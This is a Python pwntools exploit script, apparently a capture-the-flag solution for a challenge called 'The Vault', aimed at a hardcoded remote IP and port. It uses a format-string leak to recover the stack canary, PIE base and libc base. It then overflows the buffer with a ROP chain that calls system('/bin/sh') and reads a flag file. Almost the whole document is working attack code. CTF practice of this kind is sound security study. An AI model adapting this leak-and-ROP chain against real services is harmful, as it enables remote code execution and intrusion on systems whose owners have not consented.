#!/usr/bin/env python3
"""q3 — The Vault: one format-string round leaks canary/PIE/libc, then a
second read overflows into a ROP chain -> system("/bin/sh").

Stack map (buffer at %6$p):
  %23$p = canary (buffer+0x88)
  %25$p = saved RIP -> PIE + 0x1147
  %29$p = main's return into libc -> libc + 0x2a1ca (after call main)
"""
from pwn import *

context.binary = e = ELF("player/chall")
context.log_level = "info"

HOST, PORT = "35.192.106.100", 20003
RET = 0x101A            # binary ret for stack alignment
PIE_RET_OFF = 0x1147    # saved RIP offset (return into main)
LIBC_RET_OFF = 0x2A1CA  # __libc_init_first: return after `call rax` (main)
OFF = 0x88              # buffer -> canary

libc = ELF("player/libc.so.6")
POP_RDI = libc.symbols["__libc_start_main"] - 0x2A200 + 0x10C08D
SYSTEM = libc.symbols["system"]
BINSH = next(libc.search(b"/bin/sh"))


def attempt():
    io = remote(HOST, PORT)
    io.recvuntil(b"vault> ", timeout=5)
    io.sendline(b"%23$p.%25$p.%29$p")
    d = io.recvuntil(b"gift?", timeout=5)
    line = d.split(b"\n")[0].decode()
    canary, pie_ret, libc_ret = (int(x, 16) for x in line.split("."))
    pie = pie_ret - PIE_RET_OFF
    libc.address = libc_ret - LIBC_RET_OFF
    log.success("canary=%#x pie=%#x libc=%#x", canary, pie, libc.address)

    chain = flat([
        pie + RET,
        libc.address + POP_RDI,
        libc.address + BINSH,
        libc.address + SYSTEM,
    ])
    payload = b"A" * OFF + p64(canary) + p64(0) + chain
    io.send(payload)
    io.sendline(b"cat /home/ctf/flag.txt")
    print(io.recvall(timeout=4).decode(errors="replace"))
    io.close()


def main():
    for _ in range(8):
        try:
            attempt()
            return
        except Exception as exc:
            log.warning("retry: %s", exc)


if __name__ == "__main__":
    main()
